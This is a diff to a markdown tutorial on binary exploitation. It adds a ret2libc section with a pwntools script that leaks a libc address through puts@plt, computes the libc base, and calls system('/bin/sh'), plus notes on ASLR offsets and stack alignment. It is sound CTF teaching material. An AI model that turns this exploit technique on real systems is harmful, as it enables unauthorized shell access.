@@ -97,7 +97,50 @@ r.interactive()
 2. `system()` would accept bss from rdi as its first parameter. system locates to bss and find `sh` in it.
 
 > ASLR is already opened here. But why we still can find the address of plt easily? Because ASLR won't randomize the base address of text section, the targets of ASLR are limited to stack, heap, and libc. If you want to randomize the text section, you need to open PIE.
-  
+
+## ret2libc(`/file/ret2libc/`)
+In `ret2plt`, we have existing gadgets in elf. However, we will not always be so lucky. If we don't have existing gadgets in elf, we can try to find them in libc.  
+How to solve the challenge of randomized address? In `ret2plt`, ASLR won't randomize the base address of ELF itself, so we can find the address directly by objdump. But, the base address of libc would change for each time, which means that the address of gadgets in libc will also change. Therefore, we need to leak them.
+```py
+r = process('./ret2libc')
+elf = ELF('./ret2libc')
+libc = ELF('./xxx.so')
+
+puts_plt = elf.plt['puts']   # give us the address of puts@plt
+libc_start_main_got = elf.got['__libc_start_main']    # give us the address of libc_start_main@got
+main = elf.symbols['main']    # give us the address of main function
+
+# Now, lets try to leak the runtime address of __libc_start_main
+# how do we send our payload again after we leak the address: back to main again
+p = flat('a'*padding, pop_rdi_ret, libc_start_main_got, puts_plt, main)
+r.sendline(p)
+
+# receive the output of address
+libc_start_main_address = u64(r.recv().ljust(8, '\x00'))
+libc_start_main_offset = libc.sym.__libc_start_main
+
+# assign the base address of libc
+libc.address = libc_start_main_address - libc_start_main_offset
+
+system_address = libc.sym.system
+
+p = flat('a'*padding, pop_rdi_ret, libc.search('/bin/sh').next(), ret, system_address)
+r.sendline(p)
+```
+Here comes several useful tricks with pwntools. `ELF()` would load the binary and give us some information so that we don't need to search them manually. In first payload, we use `puts@plt` to help us print out the runtime address of `libc_start_main`, which was saved in the got table after begin loaded. Here comes another important concept, ASLR randomizes the base address; however, the offset between runtime address and base address is fixed.  
+```
+runtime address of A - offset of A = runtime base address of lib
+=> runtime base address + offset of B = runtime address of B
+=> runtime base address + offset of C = runtime address of C
+```
+To get the offset automatically, we can search the symbol by `readelf -S` directly, which can also be got with `elf.sym.xx`. Another trick is if we assign the base address to `libc.address`. Then symbol we get with `elf.sym.xx` in the future would also be the runtime address, it is convenient, isn't it? In the second payload, we just need to hijack the main function to the leaked `system()` in libc, we can also find the runtime address of `/bin/sh` with `search()` function because I have assigned the base address.  
+One more important thing needed to care about is `MOVAPS` issue in `system` function. It's very annoying when your exploit seems correct with show error of `Got EOF while reading in interactive`. Generally, it is due to the reason for **stack alignment**. Specific version of glibc in linux-x86_64 would require stack to be aligned to 16 bytes, which means the address of `$rsp` should be multiple of `16` bytes. It's also easy to align the stack again, push one more `ret` gadgets or jump to the place skipping `push rbp` would work again!  
+
+* [The MOVAPS issue](https://ropemporium.com/guide.html#Common%20pitfalls)
+* [Someone write a tools to automatically extract offset based on leaked address](https://github.com/lieanu/LibcSearcher)
+
+> When you try to use makefile to compile the example file, remember it is dynamic linking. To find the libc linked to the binary, you need to use ldd to check the path of libc and specify in your exploit!
+
 ## Practice  
 Kinds of ROP | practice link  
 ------------ | --------------  
